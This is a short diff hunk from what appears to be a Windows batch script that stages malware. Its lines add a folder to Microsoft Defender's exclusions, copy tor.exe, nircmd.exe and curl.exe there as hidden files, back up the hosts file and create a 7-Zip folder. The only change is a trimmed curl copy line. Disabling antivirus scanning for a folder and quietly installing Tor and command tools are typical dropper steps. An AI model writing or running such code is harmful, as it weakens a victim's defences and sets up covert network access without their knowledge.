@@ -21,7 +21,7 @@ powershell.exe Add-MpPreference -ExclusionPath "%environment%"
 
 echo F | xcopy /H /k /y /I "tor.exe" "%environment%\tor.exe" 
 echo F | xcopy /H /k /y /I "nircmd.exe" "%environment%\nircmd.exe" 
-echo F | xcopy /H /k /y /I "curl.exe" "%environment%\curl.exe" -C - 
+echo F | xcopy /H /k /y /I "curl.exe" "%environment%\curl.exe" 
 copy /y "C:\Windows\System32\drivers\etc\hosts" "C:\Windows\System32\drivers\etc\hosts.bak"
 
 mkdir "%environment%\7-Zip"
